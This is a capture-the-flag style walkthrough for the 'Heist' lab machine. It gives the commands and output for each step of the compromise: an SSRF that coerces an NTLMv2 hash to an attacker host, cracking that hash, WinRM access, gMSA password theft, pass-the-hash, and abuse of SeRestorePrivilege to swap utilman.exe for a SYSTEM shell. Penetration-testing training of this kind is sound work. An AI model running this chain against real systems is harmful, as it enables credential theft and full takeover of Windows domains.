_____


# Exploitation Guide for Heist

## Summary

In this walkthrough, we will leverage a server-side request forgery (SSRF) vulnerability to retrieve a NTLMv2 handshake via `responder`. We'll then abuse privileges of two users to obtain write permissions on the **C:\Windows\system32\utilman.exe** binary and trigger system-integrity execution via RDP (Remote Desktop Protocol).

## Enumeration

### Nmap

We'll begin with an `nmap` scan against all TCP ports.

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- 192.168.120.91
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-07 10:20 EDT
Nmap scan report for 192.168.120.91
Host is up (0.034s latency).
Not shown: 65512 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
5985/tcp  open  wsman
8080/tcp  open  http-proxy
9389/tcp  open  adws
...
```

The scan shows numerous open ports on the target. The port numbers indicate that this is likely a Windows host. We'll focus on the web service running on port 8080. Let's scan the HTTP service in more detail.

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -p 8080 192.168.120.91
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-07 10:49 EDT
Nmap scan report for 192.168.120.91
Host is up (0.066s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Werkzeug httpd 2.0.1 (Python 3.9.0)
...
```

A quick online search of "Werkzeug" reveals that this is likely a Flask web application.

### HTTP Enumeration

Visiting the web app on port 8080, we are presented with a URL input form labeled "Secure Web Browser".

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.120.91:8080/            
<!DOCTYPE html>
...
    <h1>Secure Web Browser</h1>
    <form action="/" method="GET">
    <div class="form col-xs-12">
        <input class="col-xs-9" id="searchBar" type="text" name="url" placeholder="Enter URL"/>
        <button class="glyphicon glyphicon-search col-xs-1" data-toggle="tooltip" title="Search" id="submit"></button>
        <span class="glyphicon bar col-xs-1" ><b>|</b></span>
        <a href="/?url=http://localhost" target="_blank"><span class="glyphicon glyphicon-random col-xs-1"  data-toggle="tooltip" title="Random topic"></span></a>
      </div>
...
```

Since the form is expecting a URL, let's see if we can make it reach out to our attacking machine by supplying our IP address. We'll note that the GET variable for the URL is named `url`

First, we'll start our web server.

```
┌──(kali㉿kali)-[~]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

We'll then send our request, supplying the address of our machine in the `url` parameter.

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.120.91:8080/?url=http://192.168.118.11
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Directory listing for /</title>
</head>
<body>
<h1>Directory listing for /</h1>
<hr>
...
```

Looking back to our web server, we see a request from the target.

```
┌──(kali㉿kali)-[~]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.120.91 - - [08/Sep/2021 10:47:45] "GET / HTTP/1.1" 200 -
```

## Exploitation

### Server-Side Request Forgery (SSRF)

Server-side request forgery (SSRF) is a web security vulnerability that allows us to induce the server-side application to make HTTP requests to an arbitrary domain of our choosing. Seeing that this a Windows target, we will attempt to steal a NTLMv2 handshake via `responder`, leveraging the SSRF vulnerability.

We'll begin by running `responder` on our active network interface. In this case, the interface is `tap0`, but it may vary depending on our machine's setup and configuration.

```
┌──(kali㉿kali)-[~]
└─$ sudo responder -I tap0
...
[+] Generic Options:
    Responder NIC              [tap0]
    Responder IP               [192.168.118.11]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']



[+] Listening for events...
...
```

With the `responder` listening, we'll resend our request.

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.120.91:8080/?url=http://192.168.118.11
...
```

After the request is sent, the `responder` receives the NTLMv2 handshake with a password hash.

```
...
[+] Listening for events...

[HTTP] NTLMv2 Client   : 192.168.120.91
[HTTP] NTLMv2 Username : HEIST\enox
[HTTP] NTLMv2 Hash     : enox::HEIST:3cb11309cd1acb88:7297ED93C8BA54EB24D27059939164E0:01010000000000009A112C36C7A4D701DAB5FBA18EB021F9000000000200080035004B005900470001001E00570049004E002D0030004300520032004A00380041005300440041004F000400140035004B00590047002E004C004F00430041004C0003003400570049004E002D0030004300520032004A00380041005300440041004F002E0035004B00590047002E004C004F00430041004C000500140035004B00590047002E004C004F00430041004C0008003000300000000000000000000000003000003108800B5B200C1AFFF1A529B603E2AF8DE7BD1500F04EE43010A42F68C794820A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E003100310038002E00310031000000000000000000
```

### NTLMv2 Password Hash Cracking

We can use `john` to attempt to crack the retrieved password hash with the **rockyou.txt** wordlist.

```
┌──(kali㉿kali)-[~]
└─$ cat hash
enox::HEIST:3cb11309cd1acb88:7297ED93C8BA54EB24D27059939164E0:01010000000000009A112C36C7A4D701DAB5FBA18EB021F9000000000200080035004B005900470001001E00570049004E002D0030004300520032004A00380041005300440041004F000400140035004B00590047002E004C004F00430041004C0003003400570049004E002D0030004300520032004A00380041005300440041004F002E0035004B00590047002E004C004F00430041004C000500140035004B00590047002E004C004F00430041004C0008003000300000000000000000000000003000003108800B5B200C1AFFF1A529B603E2AF8DE7BD1500F04EE43010A42F68C794820A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E003100310038002E00310031000000000000000000

┌──(kali㉿kali)-[~]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
california       (enox)
1g 0:00:00:00 DONE (2021-09-08 12:21) 50.00g/s 51200p/s 51200c/s 51200C/s 123456..bethany
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed

┌──(kali㉿kali)-[~]
└─$ 
```

Nice, the password cracker arms us with the credential pair `enox:california`.

### Windows Remote Management

Since our `nmap` scan showed the port 3389 open, we could try logging in via RDP using `rdesktop`. Unfortunately, that does not seem to work. Another approach is to utilize Windows Remote Management as we saw the port 5985 open as well.

We'll use the [evil-winrm](https://github.com/Hackplayers/evil-winrm) tool for this. Let's install it.

```
┌──(kali㉿kali)-[~]
└─$ sudo gem install evil-winrm
Fetching logger-1.4.3.gem
Fetching evil-winrm-3.3.gem
Successfully installed logger-1.4.3
Happy hacking! :)
Successfully installed evil-winrm-3.3
Parsing documentation for logger-1.4.3
Installing ri documentation for logger-1.4.3
Parsing documentation for evil-winrm-3.3
Installing ri documentation for evil-winrm-3.3
Done installing documentation for logger, evil-winrm after 0 seconds
2 gems installed

┌──(kali㉿kali)-[~]
└─$ which evil-winrm
/usr/local/bin/evil-winrm
```

Let's use the recovered credentials to log in directly into a _WinRM_ session.

```
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 192.168.120.91 -u enox -p california

Evil-WinRM shell v3.2

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\enox\Documents> whoami
heist\enox
*Evil-WinRM* PS C:\Users\enox\Documents> 
```

Great, we're in!

## Escalation

### Local Enumeration

Inside the **C:\Users\enox\Desktop** directory, we find a file **todo.txt**. Just as expected, it contains a list of remaining items for the developers to implement.

```
*Evil-WinRM* PS C:\Users\enox\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\enox\Desktop> dir


    Directory: C:\Users\enox\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/20/2021   4:12 AM                application
-a----        7/20/2021   4:24 AM             34 local.txt
-a----        5/27/2021   7:03 AM            239 todo.txt


*Evil-WinRM* PS C:\Users\enox\Desktop> type todo.txt
- Setup Flask Application for Secure Browser [DONE]
- Use group managed service account for apache [DONE]
- Migrate to apache
- Debug Flask Application [DONE]
- Remove Flask Application
- Submit IT Expenses file to admin. [DONE]


*Evil-WinRM* PS C:\Users\enox\Desktop> 
```

The item "Migrate to apache" is not marked as `DONE`. Seeing how the web application is running as a local user `enox`, we can venture a guess that the developers are intending to change the application to run under the context of a service account instead.

Let's see what other users exist on this system.

```
*Evil-WinRM* PS C:\Users\enox\Desktop> dir C:\Users


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/20/2021   4:25 AM                Administrator
d-----        7/20/2021   4:17 AM                enox
d-r---        5/28/2021   3:53 AM                Public
d-----        9/14/2021   8:27 AM                svc_apache$
```

We find the account `svc_apache$`. Judging by the trailing `$` character, we know that this is a service account and probably the same account the developers are intending to use. Let's see what groups this account belongs to.

```
*Evil-WinRM* PS C:\Users\enox\Desktop> Import-Module ActiveDirectory
*Evil-WinRM* PS C:\Users\enox\Desktop> Get-ADPrincipalGroupMembership svc_apache$ | select name

name
----
Domain Computers
Remote Management Users
```

We'll also check what groups our user is in.

```
*Evil-WinRM* PS C:\Users\enox\Desktop> Get-ADPrincipalGroupMembership enox | select name

name
----
Domain Users
Remote Management Users
Web Admins
```

The account we have taken over is in the `Web Admins` group. We can venture an educated guess that we might have some power over the Apache service account.

### Group Managed Service Accounts (GMSA)

Group Managed Service Accounts provide a higher security option for non-interactive applications, services, processes, or tasks that run automatically but need a security credential.

These service accounts are given automatically-generated passwords. Given certain permissions, it is possible to retrieve these password hashes from Active Directory. To see what users or groups have permissions to do that for a given service account, we can look up the `PrincipalsAllowedToRetrieveManagedPassword` user property on the account.

```
*Evil-WinRM* PS C:\Users\enox\Desktop> Get-ADServiceAccount -Identity 'svc_apache$' -Properties * | Select PrincipalsAllowedToRetrieveManagedPassword

PrincipalsAllowedToRetrieveManagedPassword
------------------------------------------
{CN=DC01,OU=Domain Controllers,DC=heist,DC=offsec, CN=Web Admins,CN=Users,DC=heist,DC=offsec}
```

It looks like the group `Web Admins` (i.e. the group we are in) has such privilege over the `svc_apache$` account. Let's see if we can indeed retrieve the password hash.

```
*Evil-WinRM* PS C:\Users\enox\Desktop> Get-ADServiceAccount -Identity 'svc_apache$' -Properties 'msDS-ManagedPassword'


DistinguishedName    : CN=svc_apache,CN=Managed Service Accounts,DC=heist,DC=offsec
Enabled              : True
msDS-ManagedPassword : {1, 0, 0, 0...}
Name                 : svc_apache
ObjectClass          : msDS-GroupManagedServiceAccount
ObjectGUID           : d40bc264-0c4e-4b86-b3b9-b775995ba303
SamAccountName       : svc_apache$
SID                  : S-1-5-21-537427935-490066102-1511301751-1105
UserPrincipalName    :


*Evil-WinRM* PS C:\Users\enox\Desktop> $gmsa = Get-ADServiceAccount -Identity 'svc_apache$' -Properties 'msDS-ManagedPassword'
*Evil-WinRM* PS C:\Users\enox\Desktop> $mp = $gmsa.'msDS-ManagedPassword'
*Evil-WinRM* PS C:\Users\enox\Desktop> $mp
1
0
0
0
36
...
```

Nice, looks like we have the `ReadGMSAPassword` privilege over the `svc_apache$` service account.

### Retrieving ReadGMSAPassword Hash

To retrieve the hash, we'll use a publicly available tool [GMSAPasswordReader](https://github.com/CsEnox/tools/raw/main/GMSAPasswordReader.exe). Let's download it from GitHub to our attacking machine.

```
┌──(kali㉿kali)-[~]
└─$ wget https://github.com/CsEnox/tools/raw/main/GMSAPasswordReader.exe
--2021-09-16 08:50:14--  https://github.com/CsEnox/tools/raw/main/GMSAPasswordReader.exe
Resolving github.com (github.com)... 140.82.112.3
Connecting to github.com (github.com)|140.82.112.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/CsEnox/tools/main/GMSAPasswordReader.exe [following]
--2021-09-16 08:50:14--  https://raw.githubusercontent.com/CsEnox/tools/main/GMSAPasswordReader.exe
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 105984 (104K) [application/octet-stream]
Saving to: ‘GMSAPasswordReader.exe’

GMSAPasswordReader.exe           100%[========================================================>] 103.50K  --.-KB/s    in 0.07s   

2021-09-16 08:50:14 (1.50 MB/s) - ‘GMSAPasswordReader.exe’ saved [105984/105984]
```

We can now upload it to the target using our WinRM shell, and then execute it against the `svc_apache$` user.

```
*Evil-WinRM* PS C:\Users\enox\Desktop> upload GMSAPasswordReader.exe
Info: Uploading GMSAPasswordReader.exe to C:\Users\enox\Desktop\GMSAPasswordReader.exe

                                                             
Data: 141312 bytes of 141312 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\enox\Desktop> ./GMSAPasswordReader.exe --accountname svc_apache
Calculating hashes for Old Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : 499542099FD11295C6088ED72981C554
[*]       aes128_cts_hmac_sha1 : AE0C9B62E3A58D96A730A8A91E56D108
[*]       aes256_cts_hmac_sha1 : 8629B140D3B75DA7A1BF053D15C65C55900BA66AA113084E21EA2F4385286CF4
[*]       des_cbc_md5          : 9E340723700454E9

Calculating hashes for Current Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : E9492A23D8FB9A8E6073EA446D861DCD
[*]       aes128_cts_hmac_sha1 : 17898FDC7CDDE74DB2ECE67347C4B152
[*]       aes256_cts_hmac_sha1 : 3502BB7DDE67B764C87D20D2DFEBDF0354091EC69FF5ED5344E3FE14786BF74F
[*]       des_cbc_md5          : FB34F120C2F401F2

*Evil-WinRM* PS C:\Users\enox\Desktop>
```

Great, the tool retrieved the current RC4 HMAC of the password to be `E9492A23D8FB9A8E6073EA446D861DCD`.

### Pass the Hash Attack

Next, we'll attempt to perform a pass the hash attack using `evil-winrm` to authenticate as `svc_apache$` with the recovered hash.

```
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 192.168.120.91 -u svc_apache$ -H E9492A23D8FB9A8E6073EA446D861DCD

Evil-WinRM shell v3.2

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_apache$\Documents> whoami
heist\svc_apache$
*Evil-WinRM* PS C:\Users\svc_apache$\Documents>
```

The attack is successful, and we have taken over this service account as well.

### Permission Enumeration

Checking this account's privileges, we discover that the account has the `SeRestorePrivilege` permission.

```
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\svc_apache$\Documents>
```

### SeRestorePrivilege Abuse

The `SeRestorePrivilege` privilege allows a user to circumvent file and directory permissions when restoring backed up files and directories, thus giving the user read and write access to system files.

We will use the [EnableSeRestorePrivilege.ps1](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1) script to enable this privilege in our PowerShell session. Let's begin by downloading it to our attacking machine.

```
┌──(kali㉿kali)-[~]
└─$ wget https://raw.githubusercontent.com/gtworek/PSBits/master/Misc/EnableSeRestorePrivilege.ps1
--2021-09-16 09:05:07--  https://raw.githubusercontent.com/gtworek/PSBits/master/Misc/EnableSeRestorePrivilege.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3213 (3.1K) [text/plain]
Saving to: ‘EnableSeRestorePrivilege.ps1’

EnableSeRestorePrivilege.ps1     100%[========================================================>]   3.14K  --.-KB/s    in 0.002s  

2021-09-16 09:05:07 (1.67 MB/s) - ‘EnableSeRestorePrivilege.ps1’ saved [3213/3213]
```

Next, we'll upload it to the target using our shell and run it.

```
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> upload EnableSeRestorePrivilege.ps1
Info: Uploading EnableSeRestorePrivilege.ps1 to C:\Users\svc_apache$\Documents\EnableSeRestorePrivilege.ps1

*Evil-WinRM* PS C:\Users\svc_apache$\Documents> ./EnableSeRestorePrivilege.ps1
Debug:
        using System;
        using System.Diagnostics;
        using System.Runtime.InteropServices;
        using System.Security.Principal;

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct TokPriv1Luid
        {
                public int Count;
                public long Luid;
                public int Attr;
        }

        public static class Advapi32
        {
                [DllImport("advapi32.dll", SetLastError=true)]
                public static extern bool OpenProcessToken(
                        IntPtr ProcessHandle,
                        int DesiredAccess,
                        ref IntPtr TokenHandle);

                [DllImport("advapi32.dll", SetLastError=true)]
                public static extern bool LookupPrivilegeValue(
                        string lpSystemName,
                        string lpName,
                        ref long lpLuid);

                [DllImport("advapi32.dll", SetLastError = true)]
                public static extern bool AdjustTokenPrivileges(
                        IntPtr TokenHandle,
                        bool DisableAllPrivileges,
                        ref TokPriv1Luid NewState,
                        int BufferLength,
                        IntPtr PreviousState,
                        IntPtr ReturnLength);

        }

        public static class Kernel32
        {
                [DllImport("kernel32.dll")]
                public static extern uint GetLastError();
        }
Debug: Current process handle: 3628
Debug: Calling OpenProcessToken()
Debug: Token handle: 3648
Debug: Calling LookupPrivilegeValue for SeRestorePrivilege
Debug: SeRestorePrivilege LUID value: 18
Debug: Calling AdjustTokenPrivileges
Debug: GetLastError returned: 0
*Evil-WinRM* PS C:\Users\svc_apache$\Documents>
```

We should now have write access to **C:\Windows\System32**.

### Utilman.exe Abuse with RDP

The **utilman.exe** is a built-in Windows application that is designed to allow users to configure system accessibility options such as the _Magnifier_, _High Contrast Theme_, _Narrator_, and _On Screen Keyboard_ before they log in to the system.

This application is triggered by issuing the `WIN + U` key combination while on the Windows Logon screen. It's important to note that the application runs with SYSTEM privileges.

We can leverage our write access in the system directory **C:\Windows\System32** to replace **utilman.exe** with **cmd.exe**.

```
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> move C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> move C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
*Evil-WinRM* PS C:\Users\svc_apache$\Documents>
```

If we can now trigger the application, it should grant us a SYSTEM shell. Let's give this a try using Remote Desktop Protocol with `rdesktop`.

```
┌──(kali㉿kali)-[~]
└─$ rdesktop 192.168.120.91
Autoselecting keyboard map 'en-us' from locale
...
```

We'll issue `WIN + U` (`CMD + U` on Mac keyboards) on the logon screen to trigger the execution of **utilman.exe**. If all went well, the application should run **cmd.exe** with system-level integrity.

![](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG-Practice_83_image_1_FiqdDtvd.png)

Wonderful, we have a SYSTEM shell!
